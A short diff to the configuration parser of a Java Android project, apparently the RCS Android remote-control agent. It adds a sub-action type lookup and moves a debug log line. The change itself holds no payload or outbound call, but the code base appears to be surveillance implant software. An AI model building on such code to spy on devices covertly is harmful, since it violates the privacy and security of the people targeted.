@@ -17,6 +17,7 @@ import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.RCSException;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.action.Action;
+import com.ht.RCSAndroidGUI.action.SubActionType;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.AgentType;
 import com.ht.RCSAndroidGUI.crypto.Crypto;
@@ -330,9 +331,11 @@ public class Configuration {
 						wrappedClearConf.get(params, 0, plen);
 					}
 
-					a.addSubAction(type, params);
+					if (a.addSubAction(type, params)) {
+						Log.d("QZ", TAG + " SubAction " + j + " Type: " + SubActionType.get(type) + " Params Length: "
+								+ plen);
+					}
 
-					Log.d("QZ", TAG + " SubAction " + j + " Type: " + type + " Params Length: " + plen);
 				}
 
 				Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number");
